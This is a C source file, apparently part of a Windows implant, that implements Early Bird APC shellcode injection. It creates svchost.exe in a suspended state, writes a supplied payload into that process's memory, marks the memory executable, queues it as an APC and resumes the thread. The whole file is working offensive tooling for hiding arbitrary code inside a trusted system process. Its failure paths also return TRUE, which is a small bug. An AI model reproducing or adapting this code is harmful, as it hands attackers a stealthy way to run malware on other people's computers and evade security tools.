#include "Inject.h"


// #ifdef 

#include "Config.h"


/*
    Helper Functions
*/

BOOL CreateSuspendedProcess2(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	STARTUPINFO            Si    = { 0 };
	PROCESS_INFORMATION    Pi    = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	_dbg("\t[i] Running Debug Process: \"%s\" ... ", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&Si,
		&Pi)) {
		_dbg("[!] CreateProcessA Failed with Error : %d ", GetLastError());
		return FALSE;
	}

	_dbg("[+] DONE");

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId        = Pi.dwProcessId;
	*hProcess           = Pi.hProcess;
	*hThread            = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayload, IN SIZE_T szPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	SIZE_T szAllocSize = szPayloadSize;

	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		_dbg("\t[!] VirtualAllocEx Failed With Error : %d", GetLastError());
		return FALSE;
	}
	_dbg("\t[+] Allocated memory region at : %p", pAddress);

	SIZE_T szNumberOfBytesWritten = NULL;
	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
		_dbg("\t[!] Failed to write process memory : %d", GetLastError());
		return FALSE;
	}
	_dbg("\t[+] Copied %d bytes to allocated region.", szNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		_dbg("\t[!] VirtualProtect Failed With Error : %d", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		_dbg("\t[!] QueueUserAPC Failed With Error : %d ", GetLastError());
		return FALSE;
	}

	return TRUE;
}


/*
    Injection Functions
*/

BOOL InjectProcessViaEarlyBird(PBYTE buf, SIZE_T szShellcodeLen)
{
    /*
        TODO - move settings to the global instance xenonConfig
    */

    LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
	DWORD dwProcId = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	_dbg("[i] Creating \"%s\" as a debugged process. ", sProcName);
	if (!CreateSuspendedProcess2(sProcName, &dwProcId, &hProcess, &hThread)) {
		_dbg("Failed to create debugged process : %d", GetLastError());
		return 1;
	}
    
	_dbg("[i] Writing shellcode to target process");
	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
		_dbg("Failed to RunViaRemoteApcInjection : %d", GetLastError());
		return 1;
	}

    ResumeThread(hThread);

	// WaitForSingleObject(hThread, INFINITE);

	_dbg("[#] DONE");
	return TRUE;

}